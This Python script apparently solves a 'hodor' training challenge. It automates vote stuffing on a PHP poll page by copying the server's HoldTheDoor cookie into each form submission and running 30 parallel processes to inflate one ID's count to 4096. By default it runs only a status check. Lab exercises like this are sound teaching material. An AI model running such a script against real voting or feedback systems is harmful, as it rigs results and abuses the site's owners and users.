#!/usr/bin/python3
"""
testing app for hodor apps
uses requests library
helper variables: r.url, r.status_code, r.headers, r.text
"""
import requests
import multiprocessing

URL = 'http://54.221.6.249/level0.php'
HEADERS = {'content-type': 'application/x-www-form-urlencoded'}
DATA = {
    'id': '123',
    'holdthedoor': 'submit',
    'key': ''
}

COOKIES = {
    'HoldTheDoor': ''
}

ID = '123'
VOTES = 0

def count_votes(htmlstring):
    global VOTES
    for i in range(len(htmlstring)):
        if htmlstring[i:(i + len(ID))] == ID:
            VOTES = int(htmlstring[(i + 22):(i + 28)])
            break


def vote(end):
    global VOTES
    global DATA
    global COOKIES
    r = requests.get(URL)
    count_votes(r.text)
    while VOTES < end:
        DATA['key'] = COOKIES['HoldTheDoor'] = r.cookies['HoldTheDoor']
        r = requests.post(URL, data=DATA, headers=HEADERS, cookies=COOKIES)
        count_votes(r.text)


def start_process():
    end = 4000
    p = multiprocessing.Process(target=vote, args=(end,))
    return p


def app():
    running = []
    for i in range(30):
        running.append(start_process())
        running[i].start()
    for i in running:
        i.join()
    vote(4096)


def test():
    r = requests.get(URL)
    count_votes(r.text)
    print('Votes = {:d} for ID: {:}'.format(VOTES, ID))
    print('status code:\n', r.status_code)
    print('headers:\n', r.headers)


if __name__ == '__main__':
    test()
